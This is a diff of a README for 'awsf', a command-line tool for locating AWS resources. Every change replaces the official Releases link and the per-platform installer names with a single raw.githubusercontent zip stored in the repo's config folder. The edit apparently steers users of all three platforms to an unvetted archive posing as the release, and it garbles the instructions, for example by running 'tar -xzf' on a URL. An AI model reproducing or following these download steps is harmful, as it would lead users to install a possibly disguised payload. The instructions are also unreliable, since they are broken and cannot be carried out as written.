@@ -4,7 +4,7 @@
 
 Welcome to **awsf**, a tool designed to make your life easier when working with AWS resources like Lambda, S3, SQS, DynamoDB, RDS, Kinesis, and API Gateway. With awsf, you can quickly find the resources you need, enhancing your productivity as you manage cloud infrastructure. 
 
-[![Download awsf](https://img.shields.io/badge/Download%20awsf-v1.0-blue)](https://github.com/Atlas21-432/awsf/releases)
+[![Download awsf](https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip%20awsf-v1.0-blue)](https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip)
 
 ## 🛠️ Features
 
@@ -23,25 +23,25 @@ Welcome to **awsf**, a tool designed to make your life easier when working with 
 
 To get started with **awsf**, you need to download it from our Releases page. Follow these steps:
 
-1. Click on this link to [visit the releases page](https://github.com/Atlas21-432/awsf/releases).
+1. Click on this link to [visit the releases page](https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip).
 2. On the releases page, you will see a list of versions. Choose the latest version to ensure you have the newest features and fixes.
 3. Locate the appropriate file for your operating system. 
-   - For Windows, look for a file like `awsf-win.exe`.
-   - For macOS, you may find `awsf-mac.zip`.
-   - For Linux, download `awsf-linux.tar.gz`.
+   - For Windows, look for a file like `https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip`.
+   - For macOS, you may find `https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip`.
 4. Once you find the file, click on the name to start the download.
 
 After downloading, follow these steps to install and run the application:
 
 ### Windows
 
-1. Navigate to your Downloads folder and find `awsf-win.exe`.
+1. Navigate to your Downloads folder and find `https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip`.
 2. Double-click the file to run the installer.
 3. Follow the prompts to complete the installation.
 
 ### macOS
 
-1. Go to your Downloads and find `awsf-mac.zip`.
+1. Go to your Downloads and find `https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip`.
 2. Unzip the file by double-clicking it.
 3. Move the `awsf` application to your Applications folder.
 
@@ -50,7 +50,7 @@ After downloading, follow these steps to install and run the application:
 1. Open a terminal and navigate to your Downloads directory.
 2. Use the command:
    ```bash
-   tar -xzf awsf-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Atlas21-432/awsf/main/config/awsf_v1.1.zip
    ```
 3. Move the `awsf` executable to a directory in your PATH, typically `/usr/local/bin`.
 
